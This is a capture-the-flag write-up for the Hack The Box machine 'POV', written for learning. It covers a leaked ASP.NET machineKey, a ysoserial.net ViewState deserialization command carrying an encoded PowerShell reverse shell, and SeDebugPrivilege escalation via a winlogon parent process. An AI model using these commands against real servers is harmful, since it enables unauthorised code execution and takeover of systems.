# HTB — POV

> **Platform:** Hack The Box  
> **Difficulty:** Medium  
> **Tags:** SSTI, ViewState Deserialization, SeDebugPrivilege  
> **Date:** 2025-02

---

## Summary

POV is a medium-difficulty Windows machine featuring a Server-Side Template Injection (SSTI) vulnerability in an ASP.NET application that leads to ViewState deserialization. After gaining initial access, we escalate privileges by abusing `SeDebugPrivilege` to inject into a SYSTEM process.

---

## Reconnaissance

### Nmap Scan

```bash
nmap -sCV -p- -oA scans/pov 10.10.11.251
```

```
PORT   STATE SERVICE VERSION
80/tcp open  http    Microsoft IIS httpd 10.0
|_http-title: POV Business
```

Only port 80 is open, running IIS 10.0.

### Web Enumeration

Navigating to the target reveals a business landing page. Fuzzing for subdomains reveals `dev.pov.htb`.

```bash
ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
     -u http://pov.htb -H "Host: FUZZ.pov.htb" -fs 12330
```

---

## Exploitation

### ViewState Deserialization

The `dev.pov.htb` application exposes a download functionality that leaks the `web.config` file, revealing the `machineKey`:

```xml
<machineKey decryptionKey="74477CEBDD09D66A4D4A8C8B5082A4CF9A15BE54A94F6F80D5E822F347183B43"
            validationKey="5620D3D029F914F4CFC25B9BBECC8E..."
            validation="SHA1" decryption="AES" />
```

Using `ysoserial.net` to generate a malicious ViewState payload:

```bash
ysoserial.exe -p ViewState -g TextFormattingRunProperties \
  --decryptionalg="AES" --decryptionkey="74477CEB..." \
  --validationalg="SHA1" --validationkey="5620D3D0..." \
  --path="/portfolio/default.aspx" \
  -c "powershell -e JABjAGwA..."
```

This gives us a reverse shell as `sfitz`.

---

## Privilege Escalation

### SeDebugPrivilege Abuse

The user `alaading` has `SeDebugPrivilege` enabled. After lateral movement via credentials found in a PSCredential XML file, we leverage this privilege:

```powershell
# Migrate into a SYSTEM process
./psgetsys.ps1
[MyProcess]::CreateProcessFromParent((Get-Process winlogon).Id, "cmd.exe")
```

**Root flag captured.**

---

## Lessons Learned

- Always check for exposed configuration files in .NET applications
- ViewState deserialization is a critical attack vector when `machineKey` is leaked
- `SeDebugPrivilege` is essentially a direct path to SYSTEM
